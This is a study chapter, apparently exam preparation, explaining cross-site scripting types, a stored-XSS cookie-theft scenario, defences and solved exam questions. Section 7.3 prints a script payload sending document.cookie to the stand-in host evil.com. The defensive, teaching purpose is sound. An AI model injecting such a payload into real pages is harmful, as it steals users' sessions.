7.1 What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a web application security vulnerability where an attacker injects malicious client-side scripts (typically JavaScript) into a trusted web application. The application subsequently renders the untrusted script in the browsers of innocent victim users.

🎯 Execution Context

Unlike SQL Injection (which runs on backend database servers), XSS code executes inside the victim's client browser, operating within the security context and domain privileges of the target website.

💥 Attacker Capabilities

Steal session cookies (document.cookie), hijack active user sessions, log keystrokes, capture banking credentials, or redirect users to malicious phishing pages.

7.2 3 Major Types of XSS Attacks

XSS attacks are classified based on how the malicious script reaches the victim's browser:

XSS Type Persistence & Storage Delivery Vector Impact Radius
1. Stored XSS (Persistent XSS) Permanently Stored on web server database, comments, or user profiles. Victim simply navigates to a compromised page on the website. High (Affects EVERY user who views the page).
2. Reflected XSS (Non-Persistent) Not Stored; reflected off server HTTP response. Victim clicks a malicious phishing link containing payload parameter. Medium (Affects only users who click the specific crafted link).
3. DOM-based XSS Client-side DOM vulnerability; server code not involved. Manipulating browser DOM sources (e.g. location.hash, document.URL). Medium (Purely client-side JavaScript logic flaw).

7.3 Step-by-Step Stored XSS & Session Hijacking Scenario

Walkthrough of the exact 5-step scenario detailed in PDF Slide 2 (Bablu vs. Rahul):

1

Un-sanitized Forum Input

An online forum (forum.com) allows users to submit comments without sanitizing HTML tags or escaping special characters.

2

Attacker Submits Malicious Script Payload

Attacker (Bablu) posts a forum comment containing malicious JavaScript designed to steal document cookies:

<script>
  document.location = "http://evil.com/steal?cookie=" + document.cookie;
</script>

The web server stores this raw script directly into the forum database.

3

Victim Views Forum Thread & Script Executes

Innocent user (Rahul) visits forum.com and opens Bablu's comment thread. Rahul's browser renders the comment and automatically executes the script.

4

Cookie & Session Exfiltration

The script silently extracts Rahul's session cookie (JSESSIONID) and sends an HTTP GET request carrying the cookie to Bablu's server (evil.com).

5

Session Hijacking & Impersonation

Bablu copies Rahul's stolen session cookie into his browser header, gaining full unauthorized access to Rahul's account without needing his password!

7.4 5 Core XSS Prevention & Mitigation Techniques

The PDF slide highlights 5 essential defenses to completely eliminate XSS vulnerabilities:

1. HTML Entity Encoding (Primary Line of Defense) ⭐

Convert dangerous HTML characters into harmless HTML entity codes before outputting data to the browser:

  • < $\rightarrow$ &lt;
  • > $\rightarrow$ &gt;
  • " $\rightarrow$ &quot;
  • ' $\rightarrow$ &#x27;
  • & $\rightarrow$ &amp;
<script> becomes &lt;script&gt;
(Rendered harmlessly as visible text, not executable code!)

2. Content Security Policy (CSP)

Implement HTTP response headers restricting script execution sources and blocking inline scripts:
Content-Security-Policy: default-src 'self'

3. HttpOnly Cookie Flag (Cookie Defense) ⭐

Marking session cookies as HttpOnly prevents client-side JavaScript (document.cookie) from reading cookies, defeating XSS exfiltration!

4. Input Validation & Avoid Inline Scripts

Sanitize input on the server side and refactor inline event handlers (onclick="") into external JS files.

7.5 IBPS SO IT Verified Solved Question Bank

IBPS SO IT 2023 Verified
Q1. Where does the malicious payload execute during a Cross-Site Scripting (XSS) attack?
A) On the backend SQL database server
B) Inside the victim's client web browser ✓
C) On the network domain name server (DNS)
D) Inside the hardware firewall router
Correct Answer: B) Inside the victim's client web browser.
Explanation: XSS is a client-side injection vulnerability where malicious JavaScript executes inside the victim's web browser session under the context of the vulnerable domain.
IBPS SO IT 2022 Verified
Q2. An XSS attack where the malicious script is permanently saved in a database and executed whenever any user views the comment section is classified as:
A) Reflected XSS
B) Stored XSS (Persistent XSS) ✓
C) DOM-based XSS
D) SQL Injection
Correct Answer: B) Stored XSS (Persistent XSS).
Explanation: Stored XSS persists on the server (e.g. database or comment board) and automatically infects every user who views the page.
IBPS SO IT 2020 Verified
Q3. Which HTTP cookie attribute prevents client-side JavaScript code (`document.cookie`) from accessing and exfiltrating session cookies during an XSS attack?
A) Secure Flag
B) HttpOnly Flag ✓
C) SameSite=Strict
D) Domain=Wildcard
Correct Answer: B) HttpOnly Flag.
Explanation: The `HttpOnly` flag instructs the browser that the cookie should not be accessible via client-side scripts (`document.cookie`), neutralizing XSS cookie theft.
